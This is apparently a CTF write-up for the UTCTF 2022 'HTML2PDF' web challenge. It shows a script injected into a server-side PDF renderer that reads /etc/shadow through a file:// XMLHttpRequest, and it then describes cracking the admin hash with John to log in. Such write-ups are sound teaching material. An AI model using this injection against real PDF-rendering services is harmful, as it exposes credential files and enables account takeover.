---
layout: post
category: writeups
title: "UTCTF 2022"
date: 2022-03-07
head_ctf_categories:
  - web
---
# web

## HTML2PDF

![img_name](/assets/img/UTCTF_2022/html2pdf.png){: .image-50 }


We are given a link to a web page.

![img_name](/assets/img/UTCTF_2022/html2pdf_a.png){: .image-50 }


I press the Sumbit button and I get:

![img_name](/assets/img/UTCTF_2022/html2pdf_b.png){: .image-50 }



`Rendered by HTML2PDF`: HTML2PDF as the title of the challenge, a glue?

The clue leads me to make some search fon the web and I find:

![img_name](/assets/img/UTCTF_2022/html2pdf_c.png){: .image-50 }


Good! And following the second web link:


![img_name](/assets/img/UTCTF_2022/html2pdf_d.png){: .image-50 }

Very Good! let's try a simple script:

```html
<h1 id=rd>HA HA HA</h1>
<script>
document.getElementById('rd').innerHTML= 'Hello World';
</script>
```
and I get:

![img_name](/assets/img/UTCTF_2022/html2pdf_e.png){: .image-50 }

and with another script I try to get the passwd file:


![img_name](/assets/img/UTCTF_2022/html2pdf_f.png){: .image-50 }

I get:

![img_name](/assets/img/UTCTF_2022/html2pdf_g.png){: .image-50 }

there's a nice username:`WeakPasswordAdmin`

So I try to get the shadow file using the following script:

```html
<script>
x=new XMLHttpRequest;
x.onload=function(){
document.write(this.responseText)
};
x.open("GET","file:///etc/shadow");
x.send();
</script
```

![img_name](/assets/img/UTCTF_2022/html2pdf_h.png){: .image-50 }

and I get:

![img_name](/assets/img/UTCTF_2022/html2pdf_i.png){: .image-50 }

I can see the  `hash of WeakPasswordAdmin’s password`


I try to use John to crack the password:

![img_name](/assets/img/UTCTF_2022/html2pdf_l.png){: .image-50 }

“sunshine” is the password!

So afte Log in with those credentials I get the flag:

![img_name](/assets/img/UTCTF_2022/html2pdf_m.png){: .image-50 }



